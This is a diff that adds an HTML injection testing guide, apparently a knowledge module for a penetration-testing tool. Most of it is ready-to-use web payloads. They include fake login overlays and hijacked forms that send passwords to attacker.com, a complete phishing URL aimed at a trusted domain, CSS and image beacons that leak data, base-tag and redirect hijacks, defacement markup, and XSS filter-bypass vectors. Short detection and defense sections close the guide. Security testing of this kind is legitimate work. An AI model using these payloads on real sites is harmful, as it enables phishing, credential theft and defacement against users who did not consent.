@@ -1,0 +1,316 @@
+<html_injection_guide>
+<title>HTML INJECTION</title>
+
+<critical>HTML injection allows attackers to inject arbitrary HTML content into web pages. Unlike XSS, the focus is on content manipulation rather than script execution - though HTML injection often escalates to XSS. Impacts include phishing within trusted domains, content spoofing, defacement, form hijacking, and link manipulation.</critical>
+
+<scope>
+- Stored HTML injection (persistent in database/files)
+- Reflected HTML injection (immediate response)
+- DOM-based HTML injection (client-side rendering)
+- Email HTML injection (phishing via HTML emails)
+- Form action manipulation
+- Link injection and open redirect
+- Content spoofing and defacement
+</scope>
+
+<methodology>
+1. Identify user input reflected in HTML response without proper encoding.
+2. Test for HTML tag injection with benign tags (<b>, <i>, <u>).
+3. Escalate to structural HTML injection (forms, links, iframes).
+4. Attempt script injection to identify XSS potential.
+5. Evaluate impact: phishing, form hijacking, content manipulation.
+</methodology>
+
+<injection_points>
+<common_surfaces>
+{% raw %}
+- User profile fields (name, bio, location)
+- Comments and reviews
+- Forum posts and messages
+- Search results and error messages
+- URL parameters reflected in page
+- File names and metadata
+- Email templates
+- PDF generation from user input
+- Print layouts and exports
+{% endraw %}
+</common_surfaces>
+
+<parameter_types>
+{% raw %}
+# Query parameters
+?search=<h1>Injected</h1>
+?error=<img src=x>
+?name=<form action="evil.com">
+
+# POST data
+username=<script>&password=test
+
+# Headers
+User-Agent: <img src=x>
+Referer: <script>alert(1)</script>
+
+# Path segments
+/profile/<h1>injected</h1>/view
+{% endraw %}
+</parameter_types>
+</injection_points>
+
+<payloads>
+<basic_html>
+{% raw %}
+# Text formatting (detection)
+<b>bold</b>
+<i>italic</i>
+<u>underlined</u>
+<marquee>scrolling</marquee>
+
+# Structural elements
+<h1>Injected Header</h1>
+<p style="color:red;font-size:50px;">Warning!</p>
+<div style="background:red;padding:20px;">Alert!</div>
+
+# Content insertion
+<img src="https://attacker.com/image.png">
+<iframe src="https://attacker.com/phishing"></iframe>
+<video src="https://attacker.com/video.mp4" autoplay></video>
+{% endraw %}
+</basic_html>
+
+<form_hijacking>
+{% raw %}
+# Close existing form and create new one
+</form><form action="https://attacker.com/steal" method="POST">
+<input name="password" placeholder="Re-enter password">
+<input type="submit" value="Submit">
+
+# Hidden form overlay
+<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
+<h1>Session Expired</h1>
+<form action="https://attacker.com/steal">
+Username: <input name="user"><br>
+Password: <input name="pass" type="password"><br>
+<input type="submit" value="Login">
+</form>
+</div>
+
+# Form action override (if within form)
+" formaction="https://attacker.com/steal" formmethod="POST
+{% endraw %}
+</form_hijacking>
+
+<link_manipulation>
+{% raw %}
+# Inject malicious links
+<a href="https://attacker.com/phishing">Click here for support</a>
+
+# Base tag injection (changes all relative URLs)
+<base href="https://attacker.com/">
+
+# Link with JavaScript (if not blocked)
+<a href="javascript:alert(document.cookie)">Click</a>
+
+# Data URI link
+<a href="data:text/html,<h1>Phishing Page</h1>">Download</a>
+
+# Meta refresh redirect
+<meta http-equiv="refresh" content="0;url=https://attacker.com/">
+{% endraw %}
+</link_manipulation>
+
+<content_spoofing>
+{% raw %}
+# Fake login prompts
+<div style="position:fixed;top:0;left:0;width:100%;background:#fff;padding:20px;z-index:9999;box-shadow:0 2px 10px rgba(0,0,0,0.2);">
+<h2>Your session has expired. Please login again.</h2>
+<form action="https://attacker.com/harvest">
+<input name="email" placeholder="Email"><br>
+<input name="password" type="password" placeholder="Password"><br>
+<button>Login</button>
+</form>
+</div>
+
+# Fake error messages
+<div class="alert alert-danger">
+Your account has been compromised. Contact support@attacker.com immediately.
+</div>
+
+# Fake success messages
+<div class="alert alert-success">
+Payment received! Click <a href="https://attacker.com/track">here</a> to track.
+</div>
+{% endraw %}
+</content_spoofing>
+
+<data_exfiltration>
+{% raw %}
+# Image-based exfiltration
+<img src="https://attacker.com/log?data=sensitive_page_content">
+
+# CSS-based exfiltration (if style attributes allowed)
+<style>
+input[value^="a"] { background: url(https://attacker.com/leak?char=a); }
+input[value^="b"] { background: url(https://attacker.com/leak?char=b); }
+</style>
+
+# Link prefetch
+<link rel="prefetch" href="https://attacker.com/track?user=victim">
+{% endraw %}
+</data_exfiltration>
+</payloads>
+
+<bypass_techniques>
+<encoding_bypass>
+{% raw %}
+# HTML entity encoding
+&lt;script&gt;  -->  <script>
+&#60;script&#62;  -->  <script>
+&#x3C;script&#x3E;  -->  <script>
+
+# Double encoding
+%253Cscript%253E  (double URL encoded)
+
+# Unicode normalization
+＜script＞  (fullwidth characters)
+<ſcript>  (long s)
+
+# Null bytes
+<scr%00ipt>
+<img%00src=x>
+{% endraw %}
+</encoding_bypass>
+
+<filter_bypass>
+{% raw %}
+# Case variations
+<ScRiPt>
+<SCRIPT>
+<img SRC=x>
+
+# Tag variations
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+
+# Attribute without quotes
+<img src=x onerror=alert(1)>
+<a href=javascript:alert(1)>click</a>
+
+# Tag name obfuscation
+<img/src=x/onerror=alert(1)>
+<img	src=x	onerror=alert(1)>
+{% endraw %}
+</filter_bypass>
+
+<context_specific>
+{% raw %}
+# Inside HTML comments
+--><img src=x><!--
+
+# Inside script blocks
+</script><img src=x>
+
+# Inside style blocks  
+</style><img src=x>
+
+# Inside attributes
+"><img src=x>
+'><img src=x>
+{% endraw %}
+</context_specific>
+</bypass_techniques>
+
+<exploitation_scenarios>
+<phishing_within_domain>
+{% raw %}
+# Inject fake login form on legitimate domain
+# User sees trusted URL but submits to attacker
+
+https://legitimate.com/search?q=</div><div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;"><h1>Session Expired</h1><form action="https://attacker.com/steal" method="POST"><input name="username" placeholder="Email"><input name="password" type="password" placeholder="Password"><button>Login</button></form></div>
+{% endraw %}
+</phishing_within_domain>
+
+<stored_defacement>
+{% raw %}
+# Profile bio injection
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;z-index:9999;text-align:center;padding-top:200px;font-size:48px;">
+HACKED BY ATTACKER
+<br>
+<a href="https://attacker.com" style="color:#0f0;">Visit us</a>
+</div>
+{% endraw %}
+</stored_defacement>
+
+<email_html_injection>
+{% raw %}
+# Inject in email template
+# If user input goes into HTML emails unsanitized
+
+Name: <a href="https://attacker.com/phishing">Click here to verify</a>
+Subject: <img src="https://attacker.com/tracker.gif" width="1" height="1">
+{% endraw %}
+</email_html_injection>
+</exploitation_scenarios>
+
+<detection>
+<indicators>
+{% raw %}
+# Vulnerable patterns:
+- User input directly in innerHTML
+- Server-side templating without encoding
+- Dynamic HTML generation from user data
+- URL parameters reflected in error messages
+- Search results displaying query unencoded
+
+# Testing approach:
+1. Submit <test123> and search response for literal tag
+2. Submit HTML entities and check if decoded
+3. Try benign tags first (<b>, <i>) to confirm injection
+4. Escalate to structural/malicious tags
+{% endraw %}
+</indicators>
+</detection>
+
+<validation>
+1. Demonstrate injected HTML rendering in page context.
+2. Show form hijacking with credentials submitted to attacker-controlled endpoint.
+3. Prove phishing attack works with injected content on trusted domain.
+4. Document specific injection point and required payload encoding.
+5. Provide evidence of persistent vs reflected injection scope.
+</validation>
+
+<false_positives>
+- HTML properly encoded as entities before rendering
+- Content Security Policy blocking inline styles/iframes
+- Output displayed as plain text (not rendered as HTML)
+- Sanitization library removing dangerous tags/attributes
+- Template engine auto-escaping enabled
+</false_positives>
+
+<impact>
+- Phishing attacks on trusted domain
+- Credential harvesting via fake forms
+- Content manipulation and defacement
+- Link hijacking redirecting users
+- SEO spam injection
+- Reputation damage through content spoofing
+- Escalation to XSS if script execution possible
+</impact>
+
+<pro_tips>
+1. Always start with benign tags (<b>, <i>) to confirm injection before escalating.
+2. HTML injection in trusted domains is more impactful than external phishing.
+3. Form hijacking is often the highest-impact HTML injection attack.
+4. Check for base tag injection - it affects all relative URLs.
+5. Stored HTML injection multiplies impact across all users.
+6. Email HTML injection can bypass many phishing filters.
+7. PDF generators often lack proper HTML encoding.
+8. Test both attribute context and element context injection.
+9. Combine with CSS injection for style-based attacks.
+10. Even without script execution, HTML injection enables effective phishing.
+</pro_tips>
+
+<remember>HTML injection transforms user input into page content manipulation. While less severe than XSS when scripts are blocked, HTML injection enables phishing on trusted domains, form hijacking, and content spoofing. Defense requires consistent output encoding and Content Security Policy.</remember>
+</html_injection_guide>
